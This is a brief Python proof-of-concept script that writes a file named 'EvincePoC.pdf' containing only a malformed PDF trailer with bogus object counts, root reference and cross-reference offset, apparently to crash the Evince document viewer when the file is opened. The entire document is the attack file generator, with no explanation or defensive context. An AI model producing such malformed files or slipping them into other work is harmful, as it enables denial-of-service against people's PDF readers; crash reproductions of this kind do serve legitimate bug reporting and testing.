#!/usr/bin/python
 
pdf = """trailer
<<
/Size 1337
/Root 42 0 R
>>
startxref
1
%%EOF
"""
  
filename = "EvincePoC.pdf"
file = open(filename,"w")
file.writelines(pdf)
file.close()
